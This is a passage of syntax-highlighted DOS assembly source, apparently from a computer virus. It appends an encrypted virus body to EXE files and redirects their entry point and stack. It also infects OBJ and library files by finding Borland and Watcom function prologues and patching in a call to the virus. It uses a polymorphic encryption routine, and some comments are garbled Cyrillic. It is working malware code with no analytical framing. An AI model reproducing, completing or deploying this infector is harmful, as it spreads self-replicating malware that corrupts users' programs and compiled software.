</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;write old header to EOF</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">;dx:ax - file size</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_exe_header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">exe_rle_table</span><span class="sc4">-</span><span class="sc5">exe_len_mod_512</span><span class="sc0"> </span><span class="sc1">;14h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">doswrite_from_heap</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">STACKBASE</span><span class="sc0"> </span><span class="sc1">;offset virus_start-10h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">exehdr.exe_SP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRUSSTACKSIZE</span><span class="sc4">-</span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">;paragraph</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">      </span><span class="sc1">;dx:ax =</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_par_dir</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRUSSTACKSIZE</span><span class="sc4">/</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">exehdr.exe_CS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">exehdr.exe_SS.h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0"> </span><span class="sc1">;64k</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">exehdr.exe_SS.h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">


    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;to heap</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">zmeflEXE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ZME_crypt</span><span class="sc0"> </span><span class="sc1">;;ret CX-SIZE</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRUSSTACKSIZE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">exehdr.exe_IP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">doswrite_from_heap</span><span class="sc0"> </span><span class="sc1">;write encrypted virus</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_sizemarker</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek_end</span><span class="sc0"> </span><span class="sc1">;get file size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_pages</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">calc_hdr_pages</span><span class="sc0">
</span><span class="sc1">;ã¬¥­ìè¨âì MinMem ­  à §¬¥à ®¢¥à«¥ï (?)</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_pages</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;®âà¨æ.</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">exehdr.exe_min_BSS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NC</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">exehdr.exe_min_BSS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">write_exehdr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_bof</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DosWrite_shbuf</span><span class="sc0">  </span><span class="sc1">;write new header</span><span class="sc0">


</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ÄÅÄÄ[process OBJ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">cycle_o</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">objhdr.recsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur</span><span class="sc0"> </span><span class="sc1">;_cx_0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_buf_22</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">obj$ret1</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">process_obj</span><span class="sc0"> </span><span class="sc1">;test size</span><span class="sc0">
</span><span class="sc1">;int 2bh</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">objhdr.rectype</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">MODEND</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">obj$ret1</span><span class="sc0">
</span><span class="sc1">;-+-[process 98]-------------+-</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">objhdr.rectype</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">SEGDEF</span><span class="sc0">
    </span><span class="sc5">PASS</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">pos98.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">objhdr.recsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">obj$ret1</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">objhdr.segattr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">SA_B</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">SA_P</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">obj$ret1</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">objhdr.segattr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0"> </span><span class="sc1">;borland windows library is WORD alignment</span><span class="sc0">
</span><span class="sc1">;    test    byte ptr [objhdr.segattr], MASK SA_A</span><span class="sc0">

    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
</span><span class="sc5">obj$ret1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stc</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dostell</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc0">
    </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">pos98.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">pos98.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">objhdr.segsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">obj$ret</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">obj$ret</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">siz98</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
</span><span class="sc1">;-+--------------------------+-</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">process_A0</span><span class="sc0">
</span><span class="sc1">;-+-[process A0]-------------+-</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">objhdr.rectype</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">LEDATA</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cycle_o</span><span class="sc0">
</span><span class="sc5">rzheap</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc1">;read (rzheap+80h, [objhdr.recsize]-4)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">6h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur_neg_ax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6h</span><span class="sc0">
    </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">posA0.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">posA0.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rzheap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">objhdr.recsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosread</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">;save file handle</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;size A0 before infect</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc1">;encode virus (rzheap+[objhdr.recsize]-4)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">zmeflOBJ</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ZME_crypt</span><span class="sc0"> </span><span class="sc1">;;ret CX-SIZE</span><span class="sc0">
</span><span class="sc1">;                    mov     [_____], ah</span><span class="sc0">
</span><span class="sc1">;                    mov     si, VIRUSSTACKSIZE</span><span class="sc0">
</span><span class="sc1">;                    mov     cx, offset start_data-VIRUSSTACKSIZE ;virus_size</span><span class="sc0">
</span><span class="sc1">;                    mov     [engdata.datasize], cx</span><span class="sc0">
</span><span class="sc1">;                    mov     [engdata.targetptr], di</span><span class="sc0">
</span><span class="sc1">;                    rep     movsb          ;copy data</span><span class="sc0">
</span><span class="sc1">;                    mov     cx, offset start_data-VIRUSSTACKSIZE ;virus_size</span><span class="sc0">
</span><span class="sc1">;                            xor ax,ax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; entry virus</span><span class="sc0">


</span><span class="sc1">;¬®¦¥â ®áë¯ âìáï, ¥á«¨ ã¢¥«¨ç¨âì à §¬¥à ¢¨àãá . á¥©ç á 7000</span><span class="sc0">
</span><span class="sc1">;­ ¤®, çâ®¡ë ¡ë«® 9 ¡«®ª®¢.?</span><span class="sc0">
</span><span class="sc1">;mov ax, cx</span><span class="sc0">
</span><span class="sc1">;add ax, 3DFh</span><span class="sc0">
</span><span class="sc1">;dec ax</span><span class="sc0">
</span><span class="sc1">;cwd</span><span class="sc0">
</span><span class="sc1">;mov si, 3E0h</span><span class="sc0">
</span><span class="sc1">;div si</span><span class="sc0">
</span><span class="sc1">;inc ax</span><span class="sc0">
</span><span class="sc1">;cwd</span><span class="sc0">
</span><span class="sc1">;mov si, 3E9h</span><span class="sc0">
</span><span class="sc1">;mul si</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rzheap</span><span class="sc0">
</span><span class="sc6">cwd</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3E0h</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fisize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc1">;scan</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">  </span><span class="sc1">;size A0 before infect</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">  </span><span class="sc1">;ptr to end A0 &amp; virus</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rzheap</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">calculate_crc</span><span class="sc0">    </span><span class="sc1">;&lt;add si,3</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">cmp_ax_CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ECh</span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;push bp; mov bp,sp ;&lt; BORLAND</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">fnd</span><span class="sc0">
        </span><span class="sc5">cmp_ax_CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E5h</span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;push bp; mov bp,sp ;&lt; BORLAND</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">fnd</span><span class="sc0">
        </span><span class="sc5">cmp_ax_CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc2">52h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C2h</span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;push dx; mov dx,ax ;&lt; WATCOM</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">fnd</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;error_exit_2:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">obj$ret</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stc</span><span class="sc0">  </span><span class="sc1">;CF - error flag for process_lib</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">fnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">opCALL</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;, 00 ;(cx+bx-3)</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">;ptr to end A0 &amp; virus</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">;restore file handle</span><span class="sc0">
</span><span class="sc1">;rezka</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rzheap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">      </span><span class="sc1">;@repeat:</span><span class="sc0">
        </span><span class="sc5">sto_byte</span><span class="sc0"> </span><span class="sc5">LEDATA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc5">MIN</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3E0h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">;block size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc5">sto_byte</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rzheap</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc1">;/----crc-------------------\
        add     al, byte ptr [di-4]</span><span class="sc0">
